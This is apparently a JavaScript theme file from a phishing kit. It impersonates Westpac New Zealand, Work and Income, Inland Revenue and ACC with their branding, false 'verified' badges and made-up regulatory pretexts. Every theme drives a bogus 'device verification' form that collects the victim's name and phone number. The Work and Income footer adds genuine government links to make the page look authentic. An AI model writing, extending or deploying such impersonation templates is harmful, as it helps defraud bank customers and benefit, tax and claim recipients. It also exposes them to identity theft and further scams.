window.themes = {
    westpac: {
        name: "Westpac",
        logo: "./assets/westpac-logo.png",
        primaryColor: "#DA1710",
        secondaryColor: "#B5140E",
        styles: "themes/westpac.css",
        content: {
            title: "Device Verification Required",
            message: "Please verify your device to continue",
            subMessage: "To comply with recent banking regulations and ensure your account security, we need to verify this device.",
            buttonText: "Verify Device",
            badges: [
                { icon: "\ud83d\udd12", text: "Bank-Grade Security" },
                { icon: "\u2713", text: "Verified by Westpac" }
            ],
            formFields: {
                firstName: { label: "First Name", placeholder: "Enter your first name" },
                lastName: { label: "Last Name", placeholder: "Enter your last name" },
                phone: { label: "Phone Number", placeholder: "021234567 or +64212345678" }
            },
            infoBox: {
                title: "Why is this required?",
                points: ["Protect against unauthorized access", "Comply with NZ banking regulations", "Ensure secure transactions"]
            },
            footer: {
                copyright: "\u00a9 2026 Westpac New Zealand Limited. All rights reserved.",
                links: [{ text: "Privacy", url: "#" }, { text: "Security", url: "#" }, { text: "Terms of Use", url: "#" }]
            }
        }
    },
    winz: {
        name: "Work and Income NZ",
        logo: "./assets/logo-winz.svg",
        primaryColor: "#0066CC",
        secondaryColor: "#004C99",
        styles: "themes/winz.css",
        content: {
            title: "Device Security Check",
            message: "Verify your device to access your benefits",
            subMessage: "To protect your personal information and ensure secure access to your payments and benefits, we need to verify this device.",
            buttonText: "Verify Device",
            badges: [
                { icon: "\ud83d\udd12", text: "Government Security" },
                { icon: "\u2713", text: "MSD Verified" }
            ],
            formFields: {
                firstName: { label: "First Name", placeholder: "Enter your first name" },
                lastName: { label: "Last Name", placeholder: "Enter your last name" },
                phone: { label: "Contact Number", placeholder: "021234567 or +64212345678" }
            },
            infoBox: {
                title: "Why do we need to verify your device?",
                points: ["Protect your benefit payments and personal details", "Ensure secure access to MyMSD", "Prevent unauthorized changes to your information"]
            },
            footer: {
                copyright: "\u00a9 2026 Ministry of Social Development. All rights reserved.",
                links: [{ text: "Privacy", url: "https://www.workandincome.govt.nz/about-this-site/privacy-disclaimer-and-copyright-information.html" }, { text: "Security", url: "https://www.workandincome.govt.nz/about-this-site/security.html" }, { text: "Contact Us", url: "https://www.workandincome.govt.nz/contact-us/" }]
            }
        }
    },
    ird: {
        name: "Inland Revenue",
        logo: "./assets/logo-winz.svg",
        primaryColor: "#00457C",
        secondaryColor: "#003366",
        styles: "themes/ird.css",
        content: {
            title: "Identity Verification Required",
            message: "Please verify your identity to continue",
            subMessage: "To protect your tax records and ensure secure access to your myIR account, we need to verify this device.",
            buttonText: "Verify Identity",
            badges: [
                { icon: "\ud83d\udd12", text: "Secure Government Service" },
                { icon: "\u2713", text: "IRD Verified" }
            ],
            formFields: {
                firstName: { label: "First Name", placeholder: "Enter your first name" },
                lastName: { label: "Last Name", placeholder: "Enter your last name" },
                phone: { label: "Mobile Number", placeholder: "021234567 or +64212345678" }
            },
            infoBox: {
                title: "Why is this verification needed?",
                points: ["Protect your tax records and personal information", "Comply with identity verification requirements", "Ensure secure access to myIR services"]
            },
            footer: {
                copyright: "\u00a9 2026 Inland Revenue Department. All rights reserved.",
                links: [{ text: "Privacy", url: "#" }, { text: "Terms of Use", url: "#" }, { text: "Contact IRD", url: "#" }]
            }
        }
    },
    acc: {
        name: "ACC",
        logo: "./assets/logo-winz.svg",
        primaryColor: "#E60000",
        secondaryColor: "#CC0000",
        styles: "themes/acc.css",
        content: {
            title: "Account Security Check",
            message: "Verify your device to access your claim",
            subMessage: "To protect your ACC claim and personal information, we need to verify this device before you can continue.",
            buttonText: "Verify Device",
            badges: [
                { icon: "\ud83d\udd12", text: "Secure Connection" },
                { icon: "\u2713", text: "ACC Verified" }
            ],
            formFields: {
                firstName: { label: "First Name", placeholder: "Enter your first name" },
                lastName: { label: "Last Name", placeholder: "Enter your last name" },
                phone: { label: "Phone Number", placeholder: "021234567 or +64212345678" }
            },
            infoBox: {
                title: "Why do we need to verify your device?",
                points: ["Protect your ACC claim and personal details", "Prevent unauthorized access to your account", "Ensure secure communication about your claim"]
            },
            footer: {
                copyright: "\u00a9 2026 Accident Compensation Corporation. All rights reserved.",
                links: [{ text: "Privacy", url: "#" }, { text: "Terms", url: "#" }, { text: "Help", url: "#" }]
            }
        }
    }
};